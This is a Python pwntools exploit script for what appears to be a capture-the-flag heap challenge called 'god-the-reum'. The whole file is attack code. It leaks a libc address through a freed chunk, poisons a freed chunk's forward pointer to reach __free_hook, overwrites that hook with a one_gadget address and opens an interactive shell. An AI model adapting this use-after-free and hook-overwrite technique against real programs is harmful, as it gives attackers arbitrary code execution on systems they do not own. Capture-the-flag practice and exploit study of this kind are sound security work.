from pwn import*

context.log_level = "debug"
context.terminal = ['tmux', 'splitw', '-h']

target = './god-the-reum'
p = process(target)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')


def create(eth):
    p.recv()
    p.sendline("1")
    p.recv()
    p.sendline(str(eth))
    
def deposit(idx,eth):
    p.recv()
    p.sendline("2")
    p.recv()
    p.sendline(str(idx))
    #p.recv()
    p.sendline(str(eth))
    
def withdraw(idx,eth):
    p.recv()
    p.sendline("3")
    p.recv()
    p.sendline(str(idx))
    p.recv()
    p.sendline(str(eth))
    
def show():
    p.recv()
    p.sendline("4")
    
def cheth(idx,eth):
    p.recv()
    p.sendline("6")
    p.recv()
    p.sendline(str(idx))
    p.recv()
    p.sendline(str(eth))
    

create(0x500)#0
create(0x80)#1

withdraw(0,0x500)#free 0
show()
p.recvuntil("ballance")
leak = int(p.recv(16),10)
libc_base = leak - libc.symbols['__malloc_hook'] - 0x10 - 88
libc.address = libc_base
free_hook = libc.symbols['__free_hook']
one_gadget = 0xfccde + libc_base

log.info("libc_base ==> {}".format(hex(libc_base)))
log.info("free_hook ==> {}".format(hex(free_hook)))

withdraw(1,0x80)
cheth(1,p64(free_hook)) #change fd

create(0x80)#2 free_hook

p.recv()
p.sendline("6")
p.recv()
p.sendline("2")
p.recv()
p.sendline(p64(one_gadget)) #write free_hook

create(0x80)#3
withdraw(3,0x80)

p.interactive()
